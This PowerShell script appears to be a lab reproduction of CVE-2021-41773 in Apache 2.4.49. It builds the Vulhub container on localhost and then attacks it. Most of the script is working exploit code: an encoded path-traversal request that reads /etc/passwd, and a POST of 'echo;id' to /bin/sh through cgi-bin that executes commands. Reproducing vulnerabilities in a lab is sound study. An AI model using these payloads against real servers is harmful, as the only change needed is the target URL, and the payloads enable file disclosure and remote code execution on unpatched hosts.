$ErrorActionPreference = "Stop"

$repoRoot = Split-Path $PSScriptRoot -Parent
$vulhubRoot = Join-Path $repoRoot "vulhub"
$target = "http://localhost:8080"

if (-not (Test-Path (Join-Path $vulhubRoot "httpd/CVE-2021-41773"))) {
    Write-Host "[*] Cloning the Vulhub sparse checkout..." -ForegroundColor Cyan
    git clone --depth 1 --filter=blob:none --sparse `
        https://github.com/vulhub/vulhub.git $vulhubRoot
    git -C $vulhubRoot sparse-checkout set httpd/CVE-2021-41773
}

Push-Location (Join-Path $vulhubRoot "httpd/CVE-2021-41773")
try {
    Write-Host "[*] Building and starting Apache 2.4.49..." -ForegroundColor Cyan
    docker compose up -d --build

    $ready = $false
    for ($i = 0; $i -lt 30; $i++) {
        Start-Sleep -Seconds 1
        try {
            $null = Invoke-WebRequest -Uri "$target/" -UseBasicParsing -TimeoutSec 2
            $ready = $true
            break
        } catch {
            if ($_.Exception.Response.StatusCode.value__ -eq 200) {
                $ready = $true
                break
            }
        }
    }
    if (-not $ready) { throw "Apache did not become ready at $target" }

    $traversal = "$target/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
    $rce = "$target/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"

    Write-Host "`n[1] Normal page:" -ForegroundColor Yellow
    curl.exe -s -o NUL -w "HTTP %{http_code}`n" "$target/"

    Write-Host "[2] Path traversal (GET /etc/passwd):" -ForegroundColor Yellow
    $passwd = curl.exe -s --path-as-is $traversal
    Write-Host ($passwd | Select-Object -First 8)
    $passwdStatus = curl.exe -s -o NUL -w "%{http_code}" --path-as-is $traversal
    Write-Host "HTTP $passwdStatus"

    Write-Host "[3] CGI command execution (POST to /bin/sh):" -ForegroundColor Yellow
    $rceOutput = curl.exe -s --path-as-is --data "echo;id" $rce
    Write-Host $rceOutput
    $rceStatus = curl.exe -s -o NUL -w "%{http_code}" --path-as-is --data "echo;id" $rce
    Write-Host "HTTP $rceStatus"

    if ($passwd -match "root:x:0:0") {
        Write-Host "`n[+] VULNERABLE: /etc/passwd was disclosed." -ForegroundColor Red
    } else {
        Write-Host "`n[-] Traversal did not return /etc/passwd." -ForegroundColor DarkYellow
    }
    if ($rceOutput -match "uid=") {
        Write-Host "[+] VULNERABLE: command execution succeeded." -ForegroundColor Red
    }
} finally {
    Pop-Location
}
